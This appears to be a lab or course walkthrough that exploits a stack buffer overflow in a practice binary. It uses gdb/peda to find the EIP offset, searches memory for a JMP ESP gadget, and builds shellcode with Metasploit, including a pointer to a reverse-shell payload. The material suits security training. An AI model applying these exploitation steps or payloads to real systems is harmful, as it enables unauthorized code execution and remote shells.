# Day 5 - Buffer Overflow

[TOC]

## Definition

Buffer Overflows are a software vulnerability that occurs when a program writes more data to a fixed memory buffer than it is allocated to hold.

## Buffer Overflow Defenses

- Non executable (NX) stack
- Address Space Layout Randomization (ASLR)
- Data Execution Prevention (DEP)
- Stack Canaries
- Position Independent Executable (PIE)

## GDB

Installation 

```bash
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

### Common Commands

```bash
disass <FUNCTION>   #   Disassemble portion of the program
info <...>  #   Supply info for specific stack areas
x/256c $<REGISTER>  #   Read characters from specific register
break <address>  #   Establish a break point
```

### Determine Vulnerable Code

```c

gets() -> fgets()
strcpy() -> strncpy()
strcat() -> strncat()
sprintf() -> snprintf()
```

## Demo - Buffer Overflow

We are using the func program for the demo

![image-20251218090810301](Images/image-20251218090810301.png)

Lets attempt to overflow:

![image-20251218090919387](Images/image-20251218090919387.png)

Lets try to understand what happened here with a debugger. gdb

```bash
gdb ./func
```

![image-20251218091141837](Images/image-20251218091141837.png)

Attempt to breakdown the main program. main is used as all programs have a main function 

```bash
pdisass main
disass main # Also works
# pdisass is the command to disassemble using peda
```

![image-20251218091316907](Images/image-20251218091316907.png)

```bash
file func 
# Will show us func is a 32-bit binary 
```

![image-20251218091734863](Images/image-20251218091734863.png)

We found the getuserinput function from the main function. We can dive further into this with pdisass

```bash
pdisass getuserinput
disass getuserinput # Also works
```

![image-20251218092029573](Images/image-20251218092029573.png)

The code lights up red, which is peda telling us this function is vulnerable. Green means its not vulnerable. 

The 'r' command will run the command in gdb/peda

```
r
```

![image-20251218095142540](Images/image-20251218095142540.png)

![image-20251218095126393](Images/image-20251218095126393.png)

Now we can utilize our script to attempt to understand where we get a buffer overflow:

```bash
buffer.py (in scripts) or exp.py
```

We can plug in a string we get from https://wiremask.eu/tools/buffer-overflow-pattern-generator/ to test the amount of data we need for the overflow. 

![image-20251218095946985](Images/image-20251218095946985.png)

Final look at the edited script. This script we run to get our buffer offset. 

![image-20251218100100160](Images/image-20251218100100160.png)

To run in gdb/peda

```bash
r <<< $(python exp.py)
```

![image-20251218100321787](Images/image-20251218100321787.png)

We need the EIP value. This is the value where the overflow occurs. 

![image-20251218100510069](Images/image-20251218100510069.png)

Plug it in to our nifty buffer overflow website  https://wiremask.eu/tools/buffer-overflow-pattern-generator/:

![image-20251218100616421](Images/image-20251218100616421.png)

We need this offset in order to exploit the buffer overflow. 

Now we adjust our python script for the exact buffer offset, eip, and take the env information out of gdb. 

First, we take most of the environment information out of gdb. We want the memory space that we read through to be accurate for the environment. 

```bash
# in regular terminal
env - gdb func
show env
unset env COLUMNS
unset env LINES
```

![image-20251218101549654](Images/image-20251218101549654.png)

Now, crash the program. 

![image-20251218101856456](Images/image-20251218101856456.png)

Run the command to show the process map:

```
info proc map
```

![image-20251218102012483](Images/image-20251218102012483.png)

Now we do this:

```bash
find /b [start address after heap], [end address at before the stack], 0xff, 0xe4 
find /b 0xf7de1000, 0xf7ffe000, 0xff, 0xe4 
# oxff and 0xe4 doesn't change
```

![image-20251218102429267](Images/image-20251218102429267.png)

![image-20251218102640180](Images/image-20251218102640180.png)

Then take the first three memory addresses and plug them into our script

![image-20251218103446010](Images/image-20251218103446010.png)

![image-20251218103559886](Images/image-20251218103559886.png)

Memory addresses are pasted in for reference. 

Adjust our eip, with the first memory addresses in reverse. If our payload fails, we move to the next address. 

![image-20251218103731823](Images/image-20251218103731823.png)

Uncomment the nop line. Comment our previous print(buffer) and uncomment the line below, print(buffer + eip + nop + buf). 

Edited look:

![image-20251218103945208](Images/image-20251218103945208.png)

Now, we start metasploit

```
msfconsole
```

![image-20251218110643759](Images/image-20251218110643759.png)

Now we'll execute some commands to use a payload

```bash
use payload/linux/x86/exec
show options
```

![image-20251218111301655](Images/image-20251218111301655.png)

```
set CMD whoami #Whatever command
show options
```

![image-20251218111428826](Images/image-20251218111428826.png)

```bash
generate -b "\x00\x0d\x20\x0a" -f python 
# Builds the payload
```

![image-20251218111609106](Images/image-20251218111609106.png)

Copy this into the exp.py (or whatever name) script. 

![image-20251218111722176](Images/image-20251218111722176.png)

Payload built. Lets try it. 

```
./func <<< $(python exp.py)
```

![image-20251218112204603](Images/image-20251218112204603.png)

Final look at script:

![image-20251218112521026](Images/image-20251218112521026.png)

Use payload/linux/x86/shell_reverse_tcp for the reverse shell. If you want to do it this way.

![image-20251218134944539](Images/image-20251218134944539.png)

If you get a weird error, like it's not taking input:

![image-20260109131536929](Images/image-20260109131536929.png)
